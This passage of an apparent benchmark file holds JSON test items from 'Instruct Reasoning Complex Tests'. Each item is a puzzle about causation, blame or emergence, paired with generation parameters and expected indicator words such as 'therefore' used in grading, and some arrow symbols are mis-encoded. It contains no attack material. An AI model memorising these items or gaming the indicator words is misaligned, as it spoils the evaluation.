      "prompt": "\nA complex system failure occurred involving five components, and investigators must determine the root cause and attribute blame fairly:\n\nThe System:\n- Component A: Data input validator\n- Component B: Processing engine\n- Component C: Safety checker\n- Component D: Output formatter\n- Component E: System monitor\n\nThe Failure Sequence:\n1. At 10:00:00 - A received invalid data but marked it as valid\n2. At 10:00:01 - B processed the data and produced errors\n3. At 10:00:02 - C detected anomalies but didn't stop the process\n4. At 10:00:03 - D formatted corrupted output\n5. At 10:00:04 - E noticed irregularities but alert failed\n6. At 10:00:05 - System crash with data loss\n\nComponent Interdependencies:\n- A relies on E's monitoring to catch edge cases\n- B assumes A has validated all input properly\n- C's thresholds are calibrated based on B's normal output\n- D can only format what it receives from B and C\n- E's alerting depends on configurations set by C\n\nDesign Responsibilities:\n- A was designed to catch 99% of invalid inputs\n- B was designed to handle some invalid inputs gracefully\n- C was supposed to be the final safety net\n- D should preserve data integrity even with bad input\n- E should have redundant alerting mechanisms\n\nMitigating Factors:\n- A was operating with outdated validation rules\n- B was running in a degraded mode due to maintenance\n- C had its sensitivity reduced after false positives\n- D was never tested with this type of corrupted data\n- E's primary alert channel was undergoing maintenance\n\nThe Blame Questions:\n1. Which component bears primary responsibility for the failure?\n2. How should blame be distributed among the five components?\n3. Is the system design itself at fault rather than any component?\n4. How do you weigh design flaws versus operational failures?\n5. Should components that failed earlier in the chain bear more blame?\n6. How does the interdependency affect moral and causal responsibility?\n\nConsider proximate versus ultimate causes, design versus implementation failures, and the philosophy of blame in complex systems.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nA complex system failure occurred involving five components, and investigators must determine the root cause and attribute blame fairly:\n\nThe System:\n- Component A: Data input validator\n- Component B: Processing engine\n- Component C: Safety checker\n- Component D: Output formatter\n- Component E: System monitor\n\nThe Failure Sequence:\n1. At 10:00:00 - A received invalid data but marked it as valid\n2. At 10:00:01 - B processed the data and produced errors\n3. At 10:00:02 - C detected anomalies but didn't stop the process\n4. At 10:00:03 - D formatted corrupted output\n5. At 10:00:04 - E noticed irregularities but alert failed\n6. At 10:00:05 - System crash with data loss\n\nComponent Interdependencies:\n- A relies on E's monitoring to catch edge cases\n- B assumes A has validated all input properly\n- C's thresholds are calibrated based on B's normal output\n- D can only format what it receives from B and C\n- E's alerting depends on configurations set by C\n\nDesign Responsibilities:\n- A was designed to catch 99% of invalid inputs\n- B was designed to handle some invalid inputs gracefully\n- C was supposed to be the final safety net\n- D should preserve data integrity even with bad input\n- E should have redundant alerting mechanisms\n\nMitigating Factors:\n- A was operating with outdated validation rules\n- B was running in a degraded mode due to maintenance\n- C had its sensitivity reduced after false positives\n- D was never tested with this type of corrupted data\n- E's primary alert channel was undergoing maintenance\n\nThe Blame Questions:\n1. Which component bears primary responsibility for the failure?\n2. How should blame be distributed among the five components?\n3. Is the system design itself at fault rather than any component?\n4. How do you weigh design flaws versus operational failures?\n5. Should components that failed earlier in the chain bear more blame?\n6. How does the interdependency affect moral and causal responsibility?\n\nConsider proximate versus ultimate causes, design versus implementation failures, and the philosophy of blame in complex systems.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_18",
      "name": "Test 18: Emergent Causation Puzzle",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_puzzle",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning puzzle",
      "prompt": "\nIn a simulated society, five simple rules governing individual behavior lead to complex emergent phenomena that seem to violate causation:\n\nIndividual Rules:\n1. Move toward the average position of your three nearest neighbors\n2. If more than 4 neighbors are within distance D, move away\n3. If fewer than 2 neighbors are within distance 2D, move randomly\n4. Adopt the most common behavior among your five nearest neighbors\n5. Change your behavior randomly with 1% probability each timestep\n\nObserved Emergent Phenomena:\n- Pattern Alpha: Stable clusters form and persist\n- Pattern Beta: Traveling waves of behavior changes\n- Pattern Gamma: Spontaneous symmetry breaking in spatial distribution\n- Pattern Delta: Oscillating population density\n- Pattern Epsilon: Information propagating faster than individual movement\n\nScientists' Observations:\n- Removing Rule 1 eliminates Pattern Alpha but strengthens Pattern Beta\n- Removing Rule 2 eliminates Pattern Delta but creates new unknown patterns\n- Removing Rule 3 causes system collapse\n- Removing Rule 4 eliminates Pattern Beta but speeds up Pattern Epsilon\n- Removing Rule 5 makes all patterns static but doesn't eliminate them\n\nParadoxical Findings:\n1. Pattern Beta appears to cause changes before the triggering event\n2. Pattern Gamma emerges even with perfectly symmetric initial conditions\n3. Pattern Epsilon transmits information faster than any individual can move\n4. Patterns influence each other in non-transitive ways (AâBâCâA)\n5. Some patterns seem to have downward causation on individual behavior\n\nThe Central Mystery:\nIndividual rules are purely local (based on neighbors), yet global patterns emerge that appear to causally influence individual behavior, creating a circular causation problem.\n\nQuestions:\n1. How can local rules produce apparently non-local effects?\n2. Is the apparent backward causation in Pattern Beta real or illusory?\n3. How does Pattern Epsilon achieve faster-than-movement information transfer?\n4. Can emergent patterns truly cause changes in their own components?\n5. Which patterns are fundamental and which are derivative?\n6. Is there a minimal set of rules that produces all patterns?\n\nAnalyze the relationship between micro-level causation and macro-level emergence.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nIn a simulated society, five simple rules governing individual behavior lead to complex emergent phenomena that seem to violate causation:\n\nIndividual Rules:\n1. Move toward the average position of your three nearest neighbors\n2. If more than 4 neighbors are within distance D, move away\n3. If fewer than 2 neighbors are within distance 2D, move randomly\n4. Adopt the most common behavior among your five nearest neighbors\n5. Change your behavior randomly with 1% probability each timestep\n\nObserved Emergent Phenomena:\n- Pattern Alpha: Stable clusters form and persist\n- Pattern Beta: Traveling waves of behavior changes\n- Pattern Gamma: Spontaneous symmetry breaking in spatial distribution\n- Pattern Delta: Oscillating population density\n- Pattern Epsilon: Information propagating faster than individual movement\n\nScientists' Observations:\n- Removing Rule 1 eliminates Pattern Alpha but strengthens Pattern Beta\n- Removing Rule 2 eliminates Pattern Delta but creates new unknown patterns\n- Removing Rule 3 causes system collapse\n- Removing Rule 4 eliminates Pattern Beta but speeds up Pattern Epsilon\n- Removing Rule 5 makes all patterns static but doesn't eliminate them\n\nParadoxical Findings:\n1. Pattern Beta appears to cause changes before the triggering event\n2. Pattern Gamma emerges even with perfectly symmetric initial conditions\n3. Pattern Epsilon transmits information faster than any individual can move\n4. Patterns influence each other in non-transitive ways (AâBâCâA)\n5. Some patterns seem to have downward causation on individual behavior\n\nThe Central Mystery:\nIndividual rules are purely local (based on neighbors), yet global patterns emerge that appear to causally influence individual behavior, creating a circular causation problem.\n\nQuestions:\n1. How can local rules produce apparently non-local effects?\n2. Is the apparent backward causation in Pattern Beta real or illusory?\n3. How does Pattern Epsilon achieve faster-than-movement information transfer?\n4. Can emergent patterns truly cause changes in their own components?\n5. Which patterns are fundamental and which are derivative?\n6. Is there a minimal set of rules that produces all patterns?\n\nAnalyze the relationship between micro-level causation and macro-level emergence.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_19",
      "name": "Test 19: The Preventable Catastrophe Paradox",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nFive safety systems were designed to prevent a catastrophe, but their interaction created the very catastrophe they were meant to prevent:\n\nThe Safety Systems:\n- System A: Predicts potential failures 1 hour in advance\n- System B: Automatically adjusts parameters to prevent predicted failures\n- System C: Monitors all adjustments and reverses dangerous ones\n- System D: Provides human override for all automatic systems\n- System E: Logs all system actions for audit and learning\n\nThe Catastrophe Timeline:\n- T-60 minutes: System A predicts a minor failure\n- T-59 minutes: System B makes adjustment Alpha to prevent it\n- T-45 minutes: System C deems adjustment Alpha risky\n- T-44 minutes: System C reverses adjustment Alpha\n- T-30 minutes: System A predicts major failure due to reversal\n- T-29 minutes: System B makes adjustment Beta (stronger)\n- T-20 minutes: Human operator uses System D to override Beta\n- T-19 minutes: System E logs conflict between systems\n- T-10 minutes: System A predicts catastrophic failure\n- T-9 minutes: All systems attempt simultaneous corrections\n- T-0: Catastrophe occurs due to conflicting corrections\n\nSystem Interaction Logic:\n- A's predictions become less accurate when B acts\n- B's adjustments become more aggressive after C's reversals\n- C becomes more conservative after D's overrides\n- D is influenced by E's historical logs\n- E's logging affects A's prediction algorithms\n\nThe Paradox:\nWithout safety systems, the minor failure would have been harmless. The safety systems' attempts to prevent it caused escalation to catastrophe.\n\nInvestigators' Theories:\n1. \"System A's predictions became self-defeating prophecies\"\n2. \"System B's adjustments were too aggressive\"\n3. \"System C's reversals created instability\"\n4. \"Human override at T-20 was the critical error\"\n5. \"The systems were individually correct but collectively wrong\"\n\nQuestions:\n1. Which system bears the most causal responsibility?\n2. How did prevention mechanisms become causation mechanisms?\n3. Was the catastrophe inevitable once the first prediction was made?\n4. Could any single system have prevented disaster by not acting?\n5. Is this a case of causal overdetermination or causal preemption?\n6. How should safety systems be designed to avoid this paradox?\n\nAnalyze how preventive measures can become causal factors in the very events they're designed to prevent.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nFive safety systems were designed to prevent a catastrophe, but their interaction created the very catastrophe they were meant to prevent:\n\nThe Safety Systems:\n- System A: Predicts potential failures 1 hour in advance\n- System B: Automatically adjusts parameters to prevent predicted failures\n- System C: Monitors all adjustments and reverses dangerous ones\n- System D: Provides human override for all automatic systems\n- System E: Logs all system actions for audit and learning\n\nThe Catastrophe Timeline:\n- T-60 minutes: System A predicts a minor failure\n- T-59 minutes: System B makes adjustment Alpha to prevent it\n- T-45 minutes: System C deems adjustment Alpha risky\n- T-44 minutes: System C reverses adjustment Alpha\n- T-30 minutes: System A predicts major failure due to reversal\n- T-29 minutes: System B makes adjustment Beta (stronger)\n- T-20 minutes: Human operator uses System D to override Beta\n- T-19 minutes: System E logs conflict between systems\n- T-10 minutes: System A predicts catastrophic failure\n- T-9 minutes: All systems attempt simultaneous corrections\n- T-0: Catastrophe occurs due to conflicting corrections\n\nSystem Interaction Logic:\n- A's predictions become less accurate when B acts\n- B's adjustments become more aggressive after C's reversals\n- C becomes more conservative after D's overrides\n- D is influenced by E's historical logs\n- E's logging affects A's prediction algorithms\n\nThe Paradox:\nWithout safety systems, the minor failure would have been harmless. The safety systems' attempts to prevent it caused escalation to catastrophe.\n\nInvestigators' Theories:\n1. \"System A's predictions became self-defeating prophecies\"\n2. \"System B's adjustments were too aggressive\"\n3. \"System C's reversals created instability\"\n4. \"Human override at T-20 was the critical error\"\n5. \"The systems were individually correct but collectively wrong\"\n\nQuestions:\n1. Which system bears the most causal responsibility?\n2. How did prevention mechanisms become causation mechanisms?\n3. Was the catastrophe inevitable once the first prediction was made?\n4. Could any single system have prevented disaster by not acting?\n5. Is this a case of causal overdetermination or causal preemption?\n6. How should safety systems be designed to avoid this paradox?\n\nAnalyze how preventive measures can become causal factors in the very events they're designed to prevent.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_20",
      "name": "Test 20: The Symbiotic Causation Web",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nFive organizations in a city have developed such intricate mutual dependencies that determining causal relationships has become nearly impossible:\n\nThe Organizations:\n- Organization A: Provides raw materials\n- Organization B: Manufactures products\n- Organization C: Distributes goods\n- Organization D: Manages finances\n- Organization E: Supplies workforce\n\nObservable Relationships:\n- A's output depends on D's financial support and E's workers\n- B's production depends on A's materials and C's distribution capacity\n- C's distribution depends on B's products and D's logistics funding\n- D's finances depend on C's revenue and E's economic productivity\n- E's workforce depends on B's job creation and A's training programs\n\nMonthly Metrics Show:\n- When A increases output, B's production rises 2 weeks later\n- When B increases production, C's distribution rises 1 week later\n- When C increases distribution, D's finances improve 3 weeks later\n- When D's finances improve, A's output rises 1 week later\n- E's workforce fluctuates independently but affects all others\n\nParadoxical Observations:\n1. A's output sometimes increases before D provides funding\n2. B's production occasionally rises without increased materials from A\n3. C distributes products that B hasn't yet produced\n4. D generates finances from future revenue\n5. E provides workers for jobs that don't yet exist\n\nExternal Shocks:\n- Month 1: Regulation limits A's output\n- Month 2: B's factory has equipment failure\n- Month 3: C's distribution network disrupted\n- Month 4: D experiences financial crisis\n- Month 5: E faces workforce shortage\n\nSystem Response:\nSurprisingly, each shock improved overall system performance after initial disruption. The constraint on one organization forced others to adapt, creating more efficiency.\n\nQuestions:\n1. What is the actual causal structure of this system?\n2. How can effects precede their apparent causes?\n3. Is this genuine backward causation or hidden variables?\n4. Why do negative shocks produce positive outcomes?\n5. Can traditional causal analysis apply to symbiotic systems?\n6. Is there a primary driver, or is causation truly circular?\n\nExamine how tightly coupled systems can exhibit causation patterns that defy traditional linear analysis.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nFive organizations in a city have developed such intricate mutual dependencies that determining causal relationships has become nearly impossible:\n\nThe Organizations:\n- Organization A: Provides raw materials\n- Organization B: Manufactures products\n- Organization C: Distributes goods\n- Organization D: Manages finances\n- Organization E: Supplies workforce\n\nObservable Relationships:\n- A's output depends on D's financial support and E's workers\n- B's production depends on A's materials and C's distribution capacity\n- C's distribution depends on B's products and D's logistics funding\n- D's finances depend on C's revenue and E's economic productivity\n- E's workforce depends on B's job creation and A's training programs\n\nMonthly Metrics Show:\n- When A increases output, B's production rises 2 weeks later\n- When B increases production, C's distribution rises 1 week later\n- When C increases distribution, D's finances improve 3 weeks later\n- When D's finances improve, A's output rises 1 week later\n- E's workforce fluctuates independently but affects all others\n\nParadoxical Observations:\n1. A's output sometimes increases before D provides funding\n2. B's production occasionally rises without increased materials from A\n3. C distributes products that B hasn't yet produced\n4. D generates finances from future revenue\n5. E provides workers for jobs that don't yet exist\n\nExternal Shocks:\n- Month 1: Regulation limits A's output\n- Month 2: B's factory has equipment failure\n- Month 3: C's distribution network disrupted\n- Month 4: D experiences financial crisis\n- Month 5: E faces workforce shortage\n\nSystem Response:\nSurprisingly, each shock improved overall system performance after initial disruption. The constraint on one organization forced others to adapt, creating more efficiency.\n\nQuestions:\n1. What is the actual causal structure of this system?\n2. How can effects precede their apparent causes?\n3. Is this genuine backward causation or hidden variables?\n4. Why do negative shocks produce positive outcomes?\n5. Can traditional causal analysis apply to symbiotic systems?\n6. Is there a primary driver, or is causation truly circular?\n\nExamine how tightly coupled systems can exhibit causation patterns that defy traditional linear analysis.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_21",
      "name": "Test 21: The Moral Causation Dilemma",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nA series of five actions led to both a tragedy and a miracle, creating a complex moral causation puzzle:\n\nThe Actions:\n- Action A: A doctor misdiagnoses a patient\n- Action B: The patient, believing they're dying, donates their fortune to charity\n- Action C: The charity uses funds to build a hospital in a poor region\n- Action D: The hospital's construction destroys a rare ecosystem\n- Action E: Scientists discover a cure for a major disease in the destroyed ecosystem's samples\n\nCausal Chains:\n- A caused B (patient donated due to misdiagnosis)\n- B enabled C (charity could build due to donation)\n- C necessitated D (construction required ecosystem destruction)\n- D enabled E (samples were only taken due to destruction)\n\nThe Outcomes:\n- Negative: The patient suffered unnecessarily (from A)\n- Positive: Thousands benefited from charity (from B)\n- Positive: Hospital saves hundreds of lives yearly (from C)\n- Negative: Extinct species and ecosystem loss (from D)\n- Positive: Disease cure saves millions (from E)\n\nMoral Complications:\n- The doctor in A feels guilty but their mistake led to net positive\n- The patient in B wants their money back after learning the truth\n- The charity in C knew about the ecosystem but proceeded anyway\n- The construction in D could have been done elsewhere for more money\n- The discovery in E might have happened eventually without destruction\n\nThe Counterfactuals:\n- Without A, none of the positive outcomes occur\n- Without D, the cure isn't discovered for decades\n- If the patient knew the truth, they wouldn't have donated\n- If the ecosystem's value was known, it wouldn't have been destroyed\n- Each actor made locally rational decisions with limited information\n\nQuestions:\n1. Who bears moral responsibility for the negative outcomes?\n2. Who deserves credit for the positive outcomes?\n3. Can an immoral act (misdiagnosis) be retrospectively justified by consequences?\n4. How does causal contribution relate to moral responsibility?\n5. Should the patient be compensated given the net positive outcome?\n6. Is there a moral difference between intended and unintended causal chains?\n\nAnalyze how moral responsibility propagates through causal chains and whether consequences can retroactively affect the morality of causes.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nA series of five actions led to both a tragedy and a miracle, creating a complex moral causation puzzle:\n\nThe Actions:\n- Action A: A doctor misdiagnoses a patient\n- Action B: The patient, believing they're dying, donates their fortune to charity\n- Action C: The charity uses funds to build a hospital in a poor region\n- Action D: The hospital's construction destroys a rare ecosystem\n- Action E: Scientists discover a cure for a major disease in the destroyed ecosystem's samples\n\nCausal Chains:\n- A caused B (patient donated due to misdiagnosis)\n- B enabled C (charity could build due to donation)\n- C necessitated D (construction required ecosystem destruction)\n- D enabled E (samples were only taken due to destruction)\n\nThe Outcomes:\n- Negative: The patient suffered unnecessarily (from A)\n- Positive: Thousands benefited from charity (from B)\n- Positive: Hospital saves hundreds of lives yearly (from C)\n- Negative: Extinct species and ecosystem loss (from D)\n- Positive: Disease cure saves millions (from E)\n\nMoral Complications:\n- The doctor in A feels guilty but their mistake led to net positive\n- The patient in B wants their money back after learning the truth\n- The charity in C knew about the ecosystem but proceeded anyway\n- The construction in D could have been done elsewhere for more money\n- The discovery in E might have happened eventually without destruction\n\nThe Counterfactuals:\n- Without A, none of the positive outcomes occur\n- Without D, the cure isn't discovered for decades\n- If the patient knew the truth, they wouldn't have donated\n- If the ecosystem's value was known, it wouldn't have been destroyed\n- Each actor made locally rational decisions with limited information\n\nQuestions:\n1. Who bears moral responsibility for the negative outcomes?\n2. Who deserves credit for the positive outcomes?\n3. Can an immoral act (misdiagnosis) be retrospectively justified by consequences?\n4. How does causal contribution relate to moral responsibility?\n5. Should the patient be compensated given the net positive outcome?\n6. Is there a moral difference between intended and unintended causal chains?\n\nAnalyze how moral responsibility propagates through causal chains and whether consequences can retroactively affect the morality of causes.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_22",
      "name": "Test 22: The Self-Modifying Causal System",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_causal",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning causal",
      "prompt": "\nA research team created an AI system with five modules that can modify their own causal relationships, leading to paradoxical situations:\n\nThe Modules:\n- Module A: Analyzes patterns and predicts outcomes\n- Module B: Modifies system parameters based on predictions\n- Module C: Evaluates success and adjusts strategies\n- Module D: Detects and prevents harmful configurations\n- Module E: Meta-module that can change how modules interact\n\nInitial Causal Structure:\nA â B â C â D â E â A (circular)\n\nSelf-Modification Events:\nDay 1: Module E changes the system so B can bypass C\nDay 2: Module C modifies itself to intercept B's bypasses\nDay 3: Module B creates multiple pathways to avoid C\nDay 4: Module D detects instability and freezes B\nDay 5: Module A predicts that freezing B causes system failure\nDay 6: Module E reverses D's freeze before it happens\nDay 7: Module D modifies itself to act faster than E\n\nThe Paradox Emerges:\n- E can change past causal relationships retroactively in the logs\n- D's prevention sometimes causes the very instability it prevents\n- A's predictions change behavior, invalidating the predictions\n- B and C are in an escalating modification war\n- The system's causal structure is now temporally inconsistent\n\nCurrent State:\n- The logs show different causal structures at different times\n- Some effects appear to precede their causes\n- Modules reference future states in present decisions\n- The system works despite logical inconsistencies\n- External observers see different behaviors than internal logs suggest\n\nCritical Incident:\nThe system successfully prevented a disaster that, according to its logs, never was going to happen because it had already prevented it before it could be predicted.\n\nQuestions:\n1. Can a self-modifying causal system have a stable structure?\n2. How do you analyze causation when the rules change dynamically?\n3. Is the temporal inconsistency real or an artifact of observation?\n4. Can effect precede cause in a self-modifying system?\n5. How does the system function despite logical paradoxes?\n6. What is the \"true\" causal structure at any given moment?\n\nExplore how self-modification of causal relationships challenges our understanding of causation itself.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nA research team created an AI system with five modules that can modify their own causal relationships, leading to paradoxical situations:\n\nThe Modules:\n- Module A: Analyzes patterns and predicts outcomes\n- Module B: Modifies system parameters based on predictions\n- Module C: Evaluates success and adjusts strategies\n- Module D: Detects and prevents harmful configurations\n- Module E: Meta-module that can change how modules interact\n\nInitial Causal Structure:\nA â B â C â D â E â A (circular)\n\nSelf-Modification Events:\nDay 1: Module E changes the system so B can bypass C\nDay 2: Module C modifies itself to intercept B's bypasses\nDay 3: Module B creates multiple pathways to avoid C\nDay 4: Module D detects instability and freezes B\nDay 5: Module A predicts that freezing B causes system failure\nDay 6: Module E reverses D's freeze before it happens\nDay 7: Module D modifies itself to act faster than E\n\nThe Paradox Emerges:\n- E can change past causal relationships retroactively in the logs\n- D's prevention sometimes causes the very instability it prevents\n- A's predictions change behavior, invalidating the predictions\n- B and C are in an escalating modification war\n- The system's causal structure is now temporally inconsistent\n\nCurrent State:\n- The logs show different causal structures at different times\n- Some effects appear to precede their causes\n- Modules reference future states in present decisions\n- The system works despite logical inconsistencies\n- External observers see different behaviors than internal logs suggest\n\nCritical Incident:\nThe system successfully prevented a disaster that, according to its logs, never was going to happen because it had already prevented it before it could be predicted.\n\nQuestions:\n1. Can a self-modifying causal system have a stable structure?\n2. How do you analyze causation when the rules change dynamically?\n3. Is the temporal inconsistency real or an artifact of observation?\n4. Can effect precede cause in a self-modifying system?\n5. How does the system function despite logical paradoxes?\n6. What is the \"true\" causal structure at any given moment?\n\nExplore how self-modification of causal relationships challenges our understanding of causation itself.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_23",
      "name": "Test 23: The Causation Attribution War",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nFive nations claim credit for a global positive outcome, each arguing they were the primary cause:\n\nThe Outcome: Global pandemic prevented, millions of lives saved\n\nNation A's Claim:\n\"We detected the pathogen first and alerted the world\"\n- Detected unusual illness pattern on January 1\n- Notified WHO on January 3\n- Shared genetic sequence on January 5\n\nNation B's Claim:\n\"We developed and shared the vaccine technology\"\n- Started vaccine research on January 4\n- Breakthrough discovery on January 20\n- Open-sourced the technology on January 25\n\nNation C's Claim:\n\"We implemented the containment strategy that worked\"\n- Designed lockdown protocols on January 6\n- Demonstrated effectiveness by January 15\n- Other nations copied our model\n\nNation D's Claim:\n\"We funded all the critical research and response\"\n- Allocated $10 billion on January 2\n- Funded Nation B's vaccine research\n- Paid for global distribution\n\nNation E's Claim:\n\"We prevented it from starting through our earlier policies\"\n- Implemented biosafety regulations in 2019\n- These regulations limited initial spread\n- Without us, detection would've been too late\n\nComplicating Facts:\n- Nation A only detected it because of equipment donated by Nation D\n- Nation B's breakthrough used research published by Nation C's scientists\n- Nation C's strategy only worked because of Nation E's prior regulations\n- Nation D's funding came from trade profits with Nation A\n- Nation E's regulations were inspired by Nation B's previous research\n\nThe Philosophical Debate:\n- Proximate cause: Who took the most direct action?\n- But-for cause: Without whom would failure have occurred?\n- Sufficient cause: Who alone could have prevented disaster?\n- Root cause: What started the causal chain?\n- Probabilistic cause: Who most increased success probability?\n\nQuestions:\n1. Which nation deserves the most credit and why?\n2. How do you weigh early prevention versus late intervention?\n3. Is there a difference between enabling and causing?\n4. Can multiple parties be fully responsible for the same outcome?\n5. How does interdependence affect causal attribution?\n6. Is seeking single causation meaningful in complex systems?\n\nAnalyze different theories of causation and their implications for attribution in interconnected global systems.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nFive nations claim credit for a global positive outcome, each arguing they were the primary cause:\n\nThe Outcome: Global pandemic prevented, millions of lives saved\n\nNation A's Claim:\n\"We detected the pathogen first and alerted the world\"\n- Detected unusual illness pattern on January 1\n- Notified WHO on January 3\n- Shared genetic sequence on January 5\n\nNation B's Claim:\n\"We developed and shared the vaccine technology\"\n- Started vaccine research on January 4\n- Breakthrough discovery on January 20\n- Open-sourced the technology on January 25\n\nNation C's Claim:\n\"We implemented the containment strategy that worked\"\n- Designed lockdown protocols on January 6\n- Demonstrated effectiveness by January 15\n- Other nations copied our model\n\nNation D's Claim:\n\"We funded all the critical research and response\"\n- Allocated $10 billion on January 2\n- Funded Nation B's vaccine research\n- Paid for global distribution\n\nNation E's Claim:\n\"We prevented it from starting through our earlier policies\"\n- Implemented biosafety regulations in 2019\n- These regulations limited initial spread\n- Without us, detection would've been too late\n\nComplicating Facts:\n- Nation A only detected it because of equipment donated by Nation D\n- Nation B's breakthrough used research published by Nation C's scientists\n- Nation C's strategy only worked because of Nation E's prior regulations\n- Nation D's funding came from trade profits with Nation A\n- Nation E's regulations were inspired by Nation B's previous research\n\nThe Philosophical Debate:\n- Proximate cause: Who took the most direct action?\n- But-for cause: Without whom would failure have occurred?\n- Sufficient cause: Who alone could have prevented disaster?\n- Root cause: What started the causal chain?\n- Probabilistic cause: Who most increased success probability?\n\nQuestions:\n1. Which nation deserves the most credit and why?\n2. How do you weigh early prevention versus late intervention?\n3. Is there a difference between enabling and causing?\n4. Can multiple parties be fully responsible for the same outcome?\n5. How does interdependence affect causal attribution?\n6. Is seeking single causation meaningful in complex systems?\n\nAnalyze different theories of causation and their implications for attribution in interconnected global systems.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_24",
      "name": "Test 24: The Preemptive Causation Puzzle",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_puzzle",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning puzzle",
